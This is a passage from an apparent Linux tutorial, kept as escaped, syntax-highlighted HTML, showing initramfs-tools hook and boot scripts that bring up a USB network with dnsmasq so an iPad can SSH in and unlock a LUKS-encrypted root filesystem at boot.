data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;if&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; [&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; !&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; -b&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; /dev/mapper/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$ROOTFS_DEV&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; ];&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt; then&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;\tif&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; [&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; -f&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; /cryptroot/crypttab &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;];&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt; then&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;\t\tROOTFS_UID&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;`&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;grep&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; $ROOTFS_DEV /cryptroot/crypttab &lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;|&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; cut&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -d&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -f&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 2&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;`&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;\telif&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; [&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; -f&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; /etc/crypttab &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;];&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt; then&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;\t\tROOTFS_UID&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;`&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;grep&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; $ROOTFS_DEV /etc/crypttab &lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;|&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; cut&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -f&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 2&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;`&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;\telse&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;\t\texit&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;\tfi&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;\t/usr/sbin/cryptsetup&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; luksOpen&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $ROOTFS_UID&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $ROOTFS_DEV&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; &amp;#x26;&amp;#x26;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; killall&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; cryptroot&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;fi&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Create /usr/share/initramfs-tools/hooks/cryptroot-unlock-ssh:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;sh&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;sh&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#!/bin/sh&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;PREREQ&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;prereqs&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;()&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; {&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;\techo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;$PREREQ&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;}&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;case&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;$1&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt; in&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5E3F;--shiki-dark:#C4704F&quot;&gt;\tprereqs&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;\t\tprereqs&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;\t\texit&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 0&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;\t;;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;esac&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /usr/share/initramfs-tools/hooks-functions&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;copy_file&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; script&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /usr/local/sbin/cryptroot-unlock-ssh.sh&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /usr/bin/cryptroot-unlock-ssh&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Create /usr/share/initramfs-tools/hooks/ipad:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;sh&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;sh&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#!/bin/sh&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;PREREQ&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;prereqs&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;()&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; {&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;\techo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;$PREREQ&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;}&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;case&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;$1&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt; in&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5E3F;--shiki-dark:#C4704F&quot;&gt;\tprereqs&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;\t\tprereqs&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;\t\texit&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 0&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;\t;;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;esac&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /usr/share/initramfs-tools/hooks-functions&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;manual_add_modules&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; dwc2&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; libcomposite&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; usb_f_ecm&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;copy_file&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; script&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /usr/local/sbin/usb0up.sh&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /usr/sbin/usb0up.sh&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;copy_file&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; script&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /usr/local/sbin/usb0down.sh&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /usr/sbin/usb0down.sh&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;copy_exec&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /usr/sbin/dnsmasq&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;copy_file&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; config&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /etc/dnsmasq.d/ipad&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /etc/dnsmasq.conf&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Create /usr/share/initramfs-tools/scripts/init-top/ipad:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;sh&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;sh&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#!/bin/sh&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;PREREQ&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;udev&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;prereqs&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;()&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; {&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;\techo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;$PREREQ&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;}&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;case&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;$1&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt; in&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5E3F;--shiki-dark:#C4704F&quot;&gt;\tprereqs&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;\t\tprereqs&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;\t\texit&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 0&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;\t;;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;esac&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /scripts/functions&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;mount&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -t&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; configfs&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; none&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /sys/kernel/config&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /usr/sbin/usb0up.sh&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;ipconfig&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -d&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;10.55.0.1:::255.255.255.248:kali:usb0&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;/usr/sbin/dnsmasq&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; --local-service&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; --user=root&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; --pid-file=/run/dnsmasq.pid&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Create /usr/share/initramfs-tools/scripts/local-bottom/ipad:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;sh&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;sh&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#!/bin/sh&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;PREREQ&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;prereqs&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;()&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; {&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;\techo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;$PREREQ&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;}&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span 